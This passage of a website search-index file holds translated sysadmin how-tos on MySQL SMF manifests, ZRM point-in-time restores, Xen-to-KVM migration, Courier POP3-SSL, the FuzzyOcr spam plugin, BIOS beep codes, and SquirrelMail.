causes the application to freeze, the issue might be that the MaxPermSize option simply isn’t being applied. By default it’s 64MB and is part of the Xms. This is why Xms should be at least twice as large as MaxPermSize. Again, for peace of mind (and because my servers allow it), I decided to set this value to 256MB. After restarting the application, the problems disappeared.\n"
            }
        );
    index.add(
            {
                id:  654 ,
                href: "\/Convertir_le_script_RC_de_MySQL_vers_un_SMF\/",
                title: "Convert MySQL RC Script to SMF",
                description: "How to convert MySQL RC startup scripts to Solaris Management Facility (SMF) configuration",
                content: "Introduction linkSolaris 10 and later now supplies MySQL as part of the OS, provided you’ve installed the “SUNWmysql[rtu]” pkgs, but it’s started via a legacy RC script still. This document details how to create an SMF manifest to start MySQL instead.\nNote: This process is only needed if you are running Solaris 10, or you wish to use the MySQL 4.x installation that is supplied with Nevada. Later builds of Nevada (I believe snv_79 and later) now come with MySQL 5.0 and includes a service manifest for this version.\nFind scripts linkFind all of the current RC scripts:\n$ find /etc/rc* /etc/init.d | grep -i mysql /etc/rc0.d/K00mysql /etc/rc1.d/K00mysql /etc/rc2.d/K00mysql /etc/rc3.d/S99mysql /etc/rcS.d/K00mysql If you’ve never configured MySQL, you may find these don’t exist yet.\nRemove all the old legacy scripts, if they exist:\nfor x in `find /etc/rc* /etc/init.d Create SMF Script linkCreate the MySQL manifest:\n\u003c?xml version=\"1.0\"?\u003e \u003c!DOCTYPE service_bundle SYSTEM \"/usr/share/lib/xml/dtd/service_bundle.dtd.1\"\u003e MySQL RDBMS 4.0.15 And copy it:\n# mkdir /var/svc/manifest/application/database # cp mysql.txt /var/svc/manifest/application/database/mysql.xml If you’ve got Postgresql installed already, you’ll already have a /var/svc/manifest/application/database directory.\nImport the manifest:\n$ svccfg validate /var/svc/manifest/application/database/mysql.xml $ svccfg import /var/svc/manifest/application/database/mysql.xml Check the service:\n$ svcs mysql STATE STIME FMRI disabled 13:23:17 svc:/application/database/mysql:default There you have it. Now to enable it, just ensure you’ve configured MySQL as per the README at /etc/sfw/mysql/README.solaris.mysql and then enable the service:\n$ svcadm enable mysql $ svcs mysql STATE STIME FMRI online 13:29:14 svc:/application/database/mysql:default "
            }
        );
    index.add(
            {
                id:  655 ,
                href: "\/ZRM_:_Sauvegardes_automatis%C3%A9es_et_restaurations_faciles\/",
                title: "ZRM: Automated Backups and Easy Restorations",
                description: "A guide to using ZRM for MySQL for automated database backups and point-in-time recovery for all MySQL storage engines",
                content: "Introduction linkZRM for MySQL is a powerful, flexible and robust backup and recovery solution for MySQL databases for all storage engines. With ZRM for MySQL a Database Administrator can automate logical or raw backup to a local or remote disk. In this How To, we attempt to explain how to recover from an user error at any given point in time.\nOur Scenario linkAt approximately 2:30pm there were 5 tablespaces added into the MovieID table. At 3pm you get a call from a user, who was trying to delete some unused tablespaces but ended up deleting the last 5 that he just added. The last full backup you performed was the night before at 7pm. How do you recover back to right before the last 5 tablespaces were deleted? In this case we will demonstrate a point in time restore.\nNote link More information on ZRM for MySQL is available here. To know more about configuring ZRM for MySQL you can look at https://www.zmanda.com/quick-mysql-backup.html. For this How To, we use ZRM for MySQL version 1.1.1. To perform incremental backups the binary logging option must be turned on. Edit the /etc/my.cnf file and add the following line under the [mysqld] section: log-bin=/var/lib/mysql/mysql-bin.log You will have restart your MySQL daemon before this goes into effect.\nVerifications linkWe will verify that the last full backup ran successfully last night:\n$ mysql-zrm-reporter -show restore-info --where backup-set=dailyrun backup_set backup_date backup_level backup_directory ---------------------------------------------------------------------------------------------------------- dailyrun Wed 18 Oct 2006 07:07:08 PM PDT 0 /var/lib/mysql-zrm/dailyrun/20061018190708 We can see above that the last full did run successfully last night at 7:07pm.\nBackup linkSo now we will run an incremental backup manually to record all the changes between the last backup and now, by typing:\nmysql-zrm-scheduler --now --backup-set dailyrun --backup-level 1 Parsing logs linkNext we will parse through the binary logs backed up in the last incremental backup\n$ mysql-zrm --action parse-binlogs --source-directory /var/lib/mysql-zrm/dailyrun/20061019151937 --backup-set dailyrun ------------------------------------------------------------ Log filename | Log Position | Timestamp | Event Type | Event ------------------------------------------------------------ /var/lib/mysql-zrm/dailyrun/20061019151937/mysql-bin.000002 | 4 | 06-11-19 14:09:58 | Start: binlog v 4, server v 5.0.22-log created 061019 14:09:58 | /var/lib/mysql-zrm/dailyrun/20061019151937/mysql-bin.000002 | 98 | 06-11-19 14:34:27 | Query | use movies; INSERT INTO `MovieID` (`MovieID`, `Year`, `MovieTitle`) VALUES ('17786', '1999', 'Sopranos: Season 1 Disc 1'); /var/lib/mysql-zrm/dailyrun/20061019151937/mysql-bin.000002 | 272 | 06-11-19 14:35:46 | Query | INSERT INTO `MovieID` (`MovieID`, `Year`, `MovieTitle`) VALUES ('17787', '1999', 'Sopranos: Season 1 Disc 2'); /var/lib/mysql-zrm/dailyrun/20061019151937/mysql-bin.000002 | 446 | 06-11-19 14:36:02 | Query | INSERT INTO `MovieID` (`MovieID`, `Year`, `MovieTitle`) VALUES ('17788', '1999', 'Sopranos: Season 1 Disc 3'); /var/lib/mysql-zrm/dailyrun/20061019151937/mysql-bin.000002 | 620 | 06-11-19 14:36:36 | Query | INSERT INTO `MovieID` (`MovieID`, `Year`, `MovieTitle`) VALUES ('17789', '1999', 'Sopranos: Season 1 Disc 4'); /var/lib/mysql-zrm/dailyrun/20061019151937/mysql-bin.000002 | 794 | 06-11-19 14:36:53 | Query | INSERT INTO `MovieID` (`MovieID`, `Year`, `MovieTitle`) VALUES ('17790', '1999', 'Sopranos: Season 1 Disc 5'); /var/lib/mysql-zrm/dailyrun/20061019151937/mysql-bin.000002 | 968 | 06-11-19 14:56:15 | Query | DELETE FROM `MovieID` WHERE `MovieID`.`MovieID` = 17786 LIMIT 1; /var/lib/mysql-zrm/dailyrun/20061019151937/mysql-bin.000002 | 1096 | 06-11-19 14:56:15 | Query | DELETE FROM `MovieID` WHERE `MovieID`.`MovieID` = 17787 LIMIT 1; /var/lib/mysql-zrm/dailyrun/20061019151937/mysql-bin.000002 | 1224 | 06-11-19 14:56:15 | Query | DELETE FROM `MovieID` WHERE `MovieID`.`MovieID` = 17788 LIMIT 1; /var/lib/mysql-zrm/dailyrun/20061019151937/mysql-bin.000002 | 1352 | 06-11-19 14:56:15 | Query | DELETE FROM `MovieID` WHERE `MovieID`.`MovieID` = 17789 LIMIT 1; /var/lib/mysql-zrm/dailyrun/20061019151937/mysql-bin.000002 | 1480 | 06-11-19 14:56:15 | Query | DELETE FROM `MovieID` WHERE `MovieID`.`MovieID` = 17790 LIMIT 1; /var/lib/mysql-zrm/dailyrun/20061019151937/mysql-bin.000002 | 1608 | 06-11-19 15:19:37 | Rotate to mysql-bin.000003 pos: 4 | ------------------------------------------------------------ INFO: Removing all of the uncompressed/unencrypted data Restoration linkSo now we will restore the database to what it looked like at approximately 2:45pm. Since the tables were added at 2:30pm and accidentally deleted at 3pm. Since we want the database back to the state it was at right before the delete.\n$ mysql-zrm --action restore --source-directory /var/lib/mysql-zrm/dailyrun/20061019151937 --backup-set dailyrun --stop-datetime \"20061019144500\" INFO: ZRM for MySQL Community Edition - version 1.1 INFO: Mail address: dba@zmanda.com is ok INFO: Input Parameters Used { INFO: verbose=1 INFO: retention-policy=10D INFO: backup-level=1 INFO: mailto=dba@zmanda.com INFO: databases=movies INFO: source-directory=/var/lib/mysql-zrm/dailyrun/20061019151937 INFO: html-reports=backup-status-info INFO: password=****** INFO: backup-mode=logical INFO: compress-plugin=/usr/bin/gzip INFO: compress=/usr/bin/gzip INFO: user=backup-user INFO: stop-datetime=20061019144500 INFO: Getting mysql variables INFO: mysqladmin --user=backup-user --password=***** variables INFO: datadir is /var/lib/mysql/ INFO: mysql_version is 5.0.22-log INFO: log_bin=ON INFO: Uncompressing backup INFO: Command used is 'cat \"/var/lib/mysql-zrm/dailyrun/20061019151937/backup-data\" | \"/usr/bin/gzip\" -d | tar --same-owner -xpsC \"/var/lib/mysql-zrm/dailyrun/20061019151937\" 2\u003e/tmp/HId0KZkvcS' INFO: Restoring incremental to tmpfile INFO: mysqlbinlog --user=backup-user --password=***** --stop-datetime=20061019144500 --database=movies -r /tmp/NNqSZFZa8R \"/var/lib/mysql-zrm/dailyrun/20061019151937\"/mysql-bin.[0-9]* INFO: restoring using command mysql --user=backup-user --password=***** -e \"source /tmp/NNqSZFZa8R;\" INFO: Incremental restore done for database movies INFO: Shutting down MySQL INFO: Removing all of the uncompressed/unencrypted data INFO: Restore done in 2 seconds. MySQL server has been shutdown. Please restart after verification. Once you restart the MySQL services you’ll notice that the database has been restored to what it looked at 2:45pm. Which means it has the last 5 tablespaces that were accidentally deleted at 3pm.\nResources linkMySQL Backups Using ZRM For MySQL 2.0\n"
            }
        );
    index.add(
            {
                id:  656 ,
                href: "\/Migration_Xen_vers_KVM\/",
                title: "Migrating from Xen to KVM",
                description: "A guide on how to migrate virtual machines from Xen to KVM virtualization platform.",
                content: "Introduction linkYou may have, like me, surrendered to the joys of user-friendly virtualization to manage some of your projects, for testing, or just to show off… In short, you used the tools from the “xen-tools” package on your Debian machine, particularly /usr/bin/xen-create-image to create your DomU instances.\nProblem linkOver time, maintaining your various modules with the xenified kernel of your Dom0 has become tedious, so you decided to switch to KVM, “it’s so simple” (except, of course, if you’re using a precompiled Debian kernel).\nThe problem is that your “foo.img” image is not directly bootable, since by default, Debian used a kernel placed on the Dom0 to boot the DomUs.\nSolutions linkHere are a few tricks to handle the problem…\nFirst solution linkIf you’ve kept those kernels (meaning you didn’t remove everything while screaming “never again this !@#$ Xen”), then you just need to launch KVM with the appropriate parameter, but I won’t go into detail as it’s trivial. (For example: qemu -hda image.img -kernel /boot/vmlinuz-2.6.22-3-686)\nSecond Solution linkIf you’ve removed the kernels, then using a host kernel will be difficult, unless you recreate a ramdisk, and then it will be less easy to move the image to run it elsewhere with qemu… So in this case, the nice and relatively quick solution is:\nDownload a Debian installer ISO (just as an example) Boot from it with: qemu -hda image.img -cdrom ../Downloads/debian-40r1-i386-businesscard.iso -boot d Follow the installation process until you have network access, then switch to a console Mount /dev/hda in /mnt (after a possible fdisk) Mount /proc, /sys and /dev in /mnt (mount -o loop) Chroot into /mnt Install a suitable kernel Install LILO (since GRUB seems to have trouble with this type of system as it stands; you can install it later) Edit the LILO configuration and execute LILO Now you can boot your image directly with KVM. You can also take the opportunity to convert the raw image to qcow2, change the network configuration, etc.\n"
            }
        );
    index.add(
            {
                id:  657 ,
                href: "\/Mise_en_place_d\u0027un_serveur_Courier_POP3_avec_SSL\/",
                title: "Setting up a Courier POP3 server with SSL",
                description: "Guide to install and configure a Courier POP3 server with SSL encryption on OpenBSD",
                content: "Introduction linkIf you want to install a POP3 server so that your emails can be retrieved from a mail client or another server, then Courier POP3 is a good solution. Additionally, setting up SSL is recommended as it provides security.\nFor the POP3 server to be fully functional, you’ll obviously need it to be accompanied by a mail server (see documentation here).\nI have done this installation on OpenBSD, so this entire documentation will be for OpenBSD, but given the simplicity of the process, it’s very easily portable to other systems.\nInstallation linkInstallation of courier-pop3:\n$ pkg_add -iv courier-pop3-4.1.1p0 --- courier-pop3-4.1.1p0 ------------------- You now need to edit appropriately the Courier-POP3 configuration files installed in /etc/courier/courier/. To use POP3-SSL, be sure to read ssl(8) and run the mkpop3dcert script if you require a self-signed certificate. To control the daemon use /usr/local/libexec/pop3.rc and /usr/local/libexec/pop3-ssl.rc. You also need to install courier-imap because there are commands needed for the POP3 server to start (which is not very well designed):\n$ pkg_add -iv courier-imap-4.1.1p2 parsing courier-imap-4.1.1p2 Dependencies for courier-imap-4.1.1p2 resolve to: courier-authlib-0.58p3, gdbm-1.8.3p0 found libspec c.41.0 in /usr/lib found libspec courierauth.0.0 in package courier-authlib-0.58p3 found libspec courierauthsasl.0.0 in package courier-authlib-0.58p3 found libspec crypto.13.0 in /usr/lib found libspec gdbm.3.0 in package gdbm-1.8.3p0 found libspec ssl.11.0 in /usr/lib adding group _courier adding user _courier installed /etc/courier/imapd-ssl from /usr/local/share/examples/courier/imapd-ssl.dist**************************************************************************** | 99% installed /etc/courier/imapd.cnf from /usr/local/share/examples/courier/imapd.cnf installed /etc/courier/imapd from /usr/local/share/examples/courier/imapd.dist*************************************************************************************| 100% installed /etc/courier/quotawarnmsg from /usr/local/share/examples/courier/quotawarnmsg.example courier-imap-4.1.1p2: complete --- courier-imap-4.1.1p2 ------------------- You now need to edit appropriately the Courier-IMAP configuration files installed in /etc/courier/courier/. Pay particular attention to the details in imapd.cnf, and read ssl(8) if necessary. You MUST set the CN in imapd.cnf to the hostname by which your IMAP server is accessed, or else clients will complain. When this is done, you can use the 'mkimapdcert' script to automatically generate a server certificate, which is installed into /etc/ssl/private/imapd.pem To control the daemon use /usr/local/libexec/imapd.rc and /usr/local/libexec/imapd-ssl.rc, and to run the authdaemon, place the following in /etc/rc.local: mkdir -p /var/run/courier{,-auth}/ /usr/local/sbin/authdaemond start Configuration linkLet’s go to the /etc/courier directory:\ncd /etc/courier Now edit the pop3d-ssl file to replace these fields:\nPOP3DSSLSTART=YES POP3_TLS_REQUIRED=1 SSLPIDFILE=/var/run/pop3d-ssl.pid Now we’ll edit the pop3d.cnf file to generate a proper file for our server:\nRANDFILE = /usr/local/sbin/pop3d.rand [ req ] default_bits = 2048 encrypt_key = yes distinguished_name = req_dn x509_extensions = cert_type prompt = no [ req_dn ] C=FR ST=IDF L=Paris O=Company Mail Server OU=Company Mail Server SSL CN=niceday emailAddress=xxx@mycompany.com [ cert_type ] nsCertType = server Then we’ll generate the SSL key:\n$ mkpop3dcert Generating a 2048 bit RSA private key ...+++ ............................+++ writing new private key to '/etc/ssl/private/pop3d.pem' ----- 512 semi-random bytes loaded Generating DH parameters, 512 bit long safe prime, generator 2 This is going to take a long time .............+................................+. The key is therefore located in /etc/ssl/private/pop3d.pem.\nService Control linkNow let’s start our service now that the configuration is complete:\n/usr/local/libexec/pop3d-ssl.rc start "
            }
        );
    index.add(
            {
                id:  658 ,
                href: "\/FuzzyOcr_Plugin_:_D%C3%A9tection_des_spams_image_%28OCR_Detection%29\/",
                title: "FuzzyOcr Plugin: Image Spam Detection (OCR Detection)",
                description: "Learn how to install and configure FuzzyOcr Plugin for SpamAssassin to detect image-based spam using OCR technology.",
                content: "Introduction linkThe most widely used anti-spam tool in the open-source world is SpamAssassin. Its operation is similar to that of the amavisd-new service. It collects results obtained from a collection of other tools and passes them to the amavisd-new service, which makes a decision about the message based on its total score.\nFrom a system perspective, implementing SpamAssassin is very simple. Just use the Debian/testing package, which is well maintained. This situation is particularly interesting because the collection of libraries and tools dependent on SpamAssassin is very large. The command:\napt-cache show spamassassin lists these dependencies.\nSpamAssassin Configuration linkThere are 2 levels to consider when configuring this tool:\nAt the system level, the /etc/spamassassin directory contains configuration files common to all users. For the amavis user, the .spamassassin directory located under the user’s home directory contains dedicated configuration files as well as databases created during execution: automatic whitelist, calculation tokens, etc. Since the scenarios described in this document use a dedicated gateway server for email processing, all configuration parameters will be in the general /etc/spamassassin directory and all databases will be in the /var/lib/amavis/.spamassassin directory.\nOptical Character Recognition linkThe trend since fall 2006 has been an explosion of spam containing animated GIF, PNG, or JPEG images. These images most often contain advertisements or dubious stock market offers.\nThe FuzzyOcr Plugin is a fairly effective weapon against image-containing spam. It uses optical character recognition to search for keywords in these images. This plugin also has some optimizations for processing deliberately corrupted image files.\nThe basic operation of the plugin, as described on the presentation web page, covers the following steps:\nSearch for images in different parts of the message Each image is analyzed to identify its format (GIF, PNG, JPEG) Depending on the detected image format, different tools are called to convert the image to PNM format The optical character recognition program gocr is called to extract text from the PNM file The obtained strings are scanned for predefined words, scores are calculated, and results are transmitted to SpamAssassin Installing the FuzzyOCR Plugin linkUnfortunately, a Debian/testing package is not yet available. Therefore, we need to do a manual installation based on the packages of the tools used by the plugin.\nFirst, download the plugin code and place the sources in the email gateway server’s directory tree:\nwget http://users.own-hero.net/~decoder/fuzzyocr/fuzzyocr-latest.tar.gz mv fuzzyocr-latest.tar.gz /usr/local/src/ cd /usr/local/src/ tar xf fuzzyocr-latest.tar.gz chown -R root.src FuzzyOcr* Next, make sure these packages are installed:\napt-get install spamassassin netpbm imagemagick libungif4g libungif-bin gocr libjpeg-progs libstring-approx-perl Configuring the FuzzyOCR Plugin linkFor this part, we don’t follow the recommendations in the INSTALL file. Indeed, the default plugin configuration expects to use the /etc/mail/spamassassin directory, which doesn’t exist on a Debian system. Furthermore, it’s not desirable to mix code and configuration elements in the /etc/ directory.\nFor the plugin code installation, the command # dpkg -L spamassassin | grep Plugin/ helps identify the directory where other plugins used by SpamAssassin are stored: /usr/share/perl5/Mail/SpamAssassin/Plugin/. So we copy the code to this directory.\ncp FuzzyOcr.pm /usr/share/perl5/Mail/SpamAssassin/Plugin/ For the configuration file, simply copy the following files to the general SpamAssassin configuration directory:\ncp FuzzyOcr.cf /etc/spamassassin/ cp FuzzyOcr.words.sample /etc/spamassassin/FuzzyOcr.words cd /etc/spamassassin Several configuration files need to be edited to adapt to the configuration context. We need to indicate the new plugin in the list traversed by SpamAssassin by adding a line at the end of the v310.pre file:\necho loadplugin FuzzyOcr /usr/share/perl5/Mail/SpamAssassin/Plugin/FuzzyOcr.pm \u003e\u003e v310.pre We need to edit the FuzzyOcr.cf file to adapt it to the context (/etc/spamassassin/FuzzyOcr.cf):\n#loadplugin FuzzyOcr FuzzyOcr.pm body FUZZY_OCR eval:fuzzyocr_check() describe FUZZY_OCR Mail contains an image with common spam text inside body FUZZY_OCR_WRONG_CTYPE eval:dummy_check() describe FUZZY_OCR_WRONG_CTYPE Mail contains an image with wrong content-type set body FUZZY_OCR_CORRUPT_IMG eval:dummy_check() describe FUZZY_OCR_CORRUPT_IMG Mail contains a corrupted image body FUZZY_OCR_KNOWN_HASH eval:dummy_check() describe FUZZY_OCR_KNOWN_HASH Mail contains an image with known hash priority FUZZY_OCR 900 ########### Plugin Configuration ############# #### Logging options ##### # Verbosity level (see manual) Attention: Don't set to 0, but to 0.0 for quiet operation. (Default value: 1) focr_verbose 4 # # Logfile (make sure it is writable by the plugin) (Default value: /etc/mail/spamassassin/FuzzyOcr.log) focr_logfile /var/log/fuzzyocr.log ########################## ##### Wordlists ##### # Here we defined the words to scan for (Default value: /etc/mail/spamassassin/FuzzyOcr.words) focr_global_wordlist /etc/spamassassin/FuzzyOcr.words # # This is the path RELATIVE to the respektive home directory for the personalized list # This list is merged with the global word list on execution (Default value: .spamassassin/fuzzyocr.words) #focr_personal_wordlist .spamassassin/fuzzyocr.words ##################### # Set this to 1 if you are running a version \u003c 3.1.4. # This will disable a function used in conjunction with animated gifs that isn't available in earlier versions (Default value: 0.0) #focr_pre314 0.0 # These parameters can be used to change other detection settings # If you leave these commented out, the defaults will be used. # Do not use \" \" around any parameters! # ##### Location of helper applications (path + binary) (Default values: /usr/bin/) ##### #focr_bin_giffix /usr/bin/giffix #focr_bin_giffix /usr/bin/giffix #focr_bin_giftext /usr/bin/giftext #focr_bin_gifasm /usr/bin/gifasm #focr_bin_gifinter /usr/bin/gifinter #focr_bin_giftopnm /usr/bin/giftopnm #focr_bin_jpegtopnm /usr/bin/jpegtopnm #focr_bin_pngtopnm /usr/bin/pngtopnm #focr_bin_ppmhist /usr/bin/ppmhist #focr_bin_convert /usr/bin/convert #focr_bin_identify /usr/bin/identify #focr_bin_gocr /usr/bin/gocr ############################################################################################ ##### Scansets, comma seperated (Default value: $gocr -i -, $gocr -l 180 -d 2 -i -) ##### # Each scanset consists of one or more commands which make text out of pnm input. # Each scanset is run seperately on the PNM data, results are combined in scoring. #focr_scansets $gocr -i -, $gocr -l 180 -d 2 -i - # # To use only one scan with default values, uncomment the next line instead #focr_scansets $gocr -i - # # Some example for more advanced sets # Thisone uses the first the standard scan, then a scanset which first reduces the image to 3 colors and then scans it with custom settings # and then it scans again only with these custom settings # NOTE: This is for advanced users only, if you have questions how to use this, ask on the ML or on IRC #focr_scansets $gocr -i -, pnmnorm 2\u003e$errfile If your version is significantly different from the one above, here’s a patch between the gateway configuration and the distributed version:\ndiff -uBb /usr/local/src/FuzzyOcr-2.3b/FuzzyOcr.cf 2006-08-25 22:56:00.000000000 +0200 +++ FuzzyOcr.cf 2006-09-10 23:23:39.000000000 +0200 @@ -1,4 +1,4 @@ -loadplugin FuzzyOcr FuzzyOcr.pm +#loadplugin FuzzyOcr FuzzyOcr.pm body FUZZY_OCR eval:fuzzyocr_check() describe FUZZY_OCR Mail contains an image with common spam text inside body FUZZY_OCR_WRONG_CTYPE eval:dummy_check() @@ -14,15 +14,15 @@ #### Logging options ##### # Verbosity level (see manual) Attention: Don't set to 0, but to 0.0 for quiet # operation. -#focr_verbose 1 +focr_verbose 4 # # Logfile (make sure it is writable by the plugin) -focr_logfile /etc/mail/spamassassin/FuzzyOcr.log +focr_logfile /var/log/fuzzyocr.log ########################## ##### Wordlists ##### # Here we defined the words to scan for -focr_global_wordlist /etc/mail/spamassassin/FuzzyOcr.words +focr_global_wordlist /etc/spamassassin/FuzzyOcr.words # # This is the path RELATIVE to the respektive home directory for the personalized list # This list is merged with the global word list on execution @@ -90,6 +90,7 @@ # # This is used to disable the OCR engine if the message has already more points # than this value (Default value: 10) #focr_autodisable_score 10 +#focr_autodisable_score 50 # # Number of minimum matches before the rule scores (Default value: 2) #focr_counts_required 2 Finally, we need to implement the configuration needed for logging:\ntouch /var/log/fuzzyocr.log chown amavis.amavis /var/log/fuzzyocr.log To limit the disk usage of the plugin’s logging while maintaining a 90-day history, create a configuration file for the logrotate service. Create this file and insert the following lines (/etc/logrotate.d/fuzzyocr):\n$ /etc/logrotate.d/fuzzyocr /var/log/fuzzyocr.log { rotate 90 daily compress delaycompress create 666 amavis amavis } Validation Tests linkBefore any manipulation, ensure that SpamAssassin is functioning correctly. The two commands:\nspamassassin --lint and\nsu - amavis -- spamassassin --lint should not produce any output. If this is not the case, you should review your SpamAssassin or amavis configuration before testing the plugin’s operation.\nNext, use the spam samples provided with the plugin sources and analyze the results:\n$ spamassassin -t /usr/local/src/FuzzyOcr-2.3b/samples/animated-gif.eml 20 FUZZY_OCR BODY: Mail contains an image with common spam text inside Words found: \"alert\" in 4 lines \"charts\" in 1 lines \"symbol\" in 1 lines \"alert\" in 4 lines \"stock\" in 2 lines \"company\" in 3 lines \"trade\" in 1 lines \"meridia\" in 1 lines \"growth\" in 1 lines (18 word occurrences found) $ spamassassin -t /usr/local/src/FuzzyOcr-2.3b/samples/corrupted-gif.eml 1.5 FUZZY_OCR_WRONG_CTYPE BODY: Mail contains an image with wrong content-type set Image has format \"GIF\" but content-type is \"image/jpeg\" 2.5 FUZZY_OCR_CORRUPT_IMG BODY: Mail contains a corrupted image Corrupt image: GIF-LIB error: Image is defective, decoding aborted. 14 FUZZY_OCR BODY: Mail contains an image with common spam text inside Words found: \"alert\" in 1 lines \"alert\" in 1 lines \"stock\" in 2 lines \"investor\" in 1 lines \"company\" in 1 lines \"price\" in 2 lines \"trade\" in 1 lines \"target\" in 1 lines \"service\" in 1 lines \"recommendation\" in 1 lines (12 word occurrences found) $ spamassassin -t /usr/local/src/FuzzyOcr-2.3b/samples/jpeg.eml 6.0 FUZZY_OCR BODY: Mail contains an image with common spam text inside Words found: \"viagra\" in 2 lines \"cialis\" in 1 lines \"levitra\" in 1 lines (4 word occurrences found) We can see that the reports on the three tested samples show that keywords were detected in the images and that the scores were increased accordingly.\nNow we just need to validate the solution in real operation! Without waiting, we get a sample that shows that optical character recognition added 18 points to the score.\nExtract from the system log produced by the amavisd-new service:\nSep 10 18:08:57 MailGw amavis[13387]: (13387-04) SPAM, \\ -\u003e , Yes, \\ score=27.449 tag=-999 tag2=6.31 kill=6.31 tests=[BAYES_50=2.5, \\ DATE_IN_FUTURE_03_06=1.961, EXTRA_MPART_TYPE=1.091, FUZZY_OCR=18.000, \\ HTML_MESSAGE=0.001, RCVD_IN_XBL=3.897, SPF_PASS=-0.001], \\ autolearn=spam, quarantine lkwO3NF5SAMT (spam-quarantine) Extract from the log produced by the plugin for the same message:\n[2006-09-10 18:08:57] Debug mode: Message is spam (score 18)... [2006-09-10 18:08:57] Debug mode: Words found: \"charts\" in 1 lines \"symbol\" in 1 lines \"stock\" in 2 lines \"international\" in 3 lines \"company\" in 2 lines \"million\" in 1 lines \"buy\" in 1 lines \"trade\" in 3 lines \"target\" in 1 lines \"meridia\" in 1 lines (16 word occurrences found) FAQ linkI still receive image-type spam, what should I do? linkYou should know that if the spam is very well camouflaged, detection will fail. But also check what the logs say. I had a problem with permissions at the log level. Make a small correction at that level if that’s what’s blocking things.\nOther Documentation linkHere is another documentation in English\n"
            }
        );
    index.add(
            {
                id:  659 ,
                href: "\/Signification_des_bips_%C3%A9mis_par_le_Bios\/",
                title: "BIOS Beep Codes and Their Meanings",
                description: "A comprehensive guide to understanding the meaning of various BIOS beep codes during computer startup problems.",
                content: "Introduction linkMany of you have probably wondered about the meaning of beeps when a computer fails to boot properly. Here’s a list of what those beeps mean.\nMeanings link 1 short beep: Refresh failure. The system has problems accessing RAM for refresh operations. The issue is often due to a RAM or motherboard problem.\n2 short beeps: Parity error. Parity error in the first 64KB of memory. Problem with either RAM or the motherboard.\n3 short beeps: Base 64k memory failure. Memory failure in the first 64KB.\n4 short beeps: Timer not operational. Problem with one of the timers used to control motherboard functions. Cause: defective motherboard.\n5 short beeps: Processor error. Try removing and reinserting the processor, making sure it’s properly seated. Note that this doesn’t mean the processor is dead, or your system wouldn’t boot at all.\n6 short beeps: 8042 - gate A20 failure. Keyboard problem. Try changing the keyboard or the keyboard controller chip (on the motherboard).\n7 short beeps: Processor exception interrupt error. Error in the virtual mode, which is one of the different modes in which the processor operates. The problem comes from the processor or motherboard.\n8 short beeps: Display memory read/write failure. The video controller is missing or the graphics card RAM is defective.\n9 short beeps: ROM checksum error. Error in the BIOS ROM. Either replace the BIOS chip or change the motherboard. Note that it may be another issue with the motherboard.\n10 short beeps: CMOS shutdown register read/write error. Error accessing CMOS memory. Problem with the motherboard.\n11 short beeps: Cache memory bad. External cache memory error. Try to properly reseat the cache memory.\n1 long beep and 2 short beeps or 1 long beep and 3 short beeps: Video error. Try reinserting the graphics card or its memory extension. If the problem persists, try another graphics card.\nIf there are no beeps and nothing on screen, the first thing to check is the power supply. To determine if the power supply is OK, connect an LED to the motherboard power LED, for example. If the LED lights up and the hard drive or CD-ROM/burner start, the power supply is normally OK.\nIf problems persist, remove all components except the graphics card. If the system starts in this case, try plugging in (not while the system is on, of course) the other components one by one to see what’s causing the problem.\nIf these explanations and their solutions haven’t fixed anything: Contact technical support.\n"
            }
        );
    index.add(
            {
                id:  660 ,
                href: "\/Cacher_une_application_ouverte_du_dock_et_du_switcher\/",
                title: "Hide an Open Application from the Dock and Switcher",
                description: "Learn how to hide Mac applications from the Dock and App Switcher while keeping them running in the background.",
                content: "Introduction linkIf you want to use software that must remain open all the time but you don’t want to have its icon in your Dock or in the switcher (Cmd + Tab), it’s possible, though it doesn’t always work in all cases.\nPrerequisites linkThere aren’t many prerequisites since the only thing you’ll need to be careful about is that before doing the following steps, your application must be closed.\nInfo.plist linkNow, let’s get to the serious business. Go to your Applications folder and find the application you want to modify. In my case, I’m using XRG (a tool that creates graphs).\nRight-click on the application, then “Show Package Contents”. Go to the “Contents” folder and edit the Info.plist file. There are only 2 lines to add at the end before :\nLSUIElement 1 Which gives me in the end:\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE plist PUBLIC \"-//Apple Computer//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\"\u003e CFBundleDevelopmentRegion English CFBundleDocumentTypes CFBundleTypeExtensions xtf CFBundleTypeIconFile xtf2 CFBundleTypeName XRG Theme File CFBundleTypeOSTypes XTF CFBundleExecutable X Resource Graph CFBundleGetInfoString XRG v1.1u CFBundleHelpBookFolder Online Help CFBundleHelpBookName XRG Help CFBundleIconFile icon4.icns CFBundleIdentifier com.piatekjimenez.xrg CFBundleInfoDictionaryVersion 6.0 CFBundleName X Resource Graph CFBundlePackageType APPL CFBundleShortVersionString 1.1u CFBundleSignature XRGA CFBundleVersion 1.1u NSMainNibFile MainMenu NSPrincipalClass NSApplication LSUIElement 1 Now, all that’s left is to save the changes and restart the application :-)\nIssues linkI made the changes but nothing different is happening linkYou need to log out and back into your session and try again.\nThe application no longer opens linkYou need to move the added lines elsewhere in the code; something is not working correctly. In the worst case, you can always delete the 2 added lines and the application will work as before.\n"
            }
        );
    index.add(
            {
                id:  661 ,
                href: "\/Squirrelmail_:_Mise_en_place_d%27un_webmail_simple_mais_%C3%A9volu%C3%A9\/",
                title: "SquirrelMail: Setting up a Simple yet Advanced Webmail",
                description: "Guide for installing and configuring SquirrelMail webmail solution",
                content: "Introduction linkSquirrelMail is a webmail client that I used for years before switching to RoundCube. While it’s not as visually attractive as RoundCube, it has the advantage of being both simple and feature-rich. The obvious prerequisites are a mail server like Postfix and a connection interface such as IMAP or POP.\nInstallation linkTo install it, it’s always very simple:\napt-get install squirrelmail Configuration linkTo configure SquirrelMail, simply use the tool provided:\nsquirrelmail-config Resources linkDocumentation on checking password strength for squirrelmail\n"
            }
        );
    index.add(
            {
                id:  662 ,
                href: "\/Sybase_:_installation_et_configuration\/",
                title: "Sybase: Installation and Configuration",
                description: "A guide to installing and configuring Sybase Adaptive Server Enterprise database on Linux systems.",
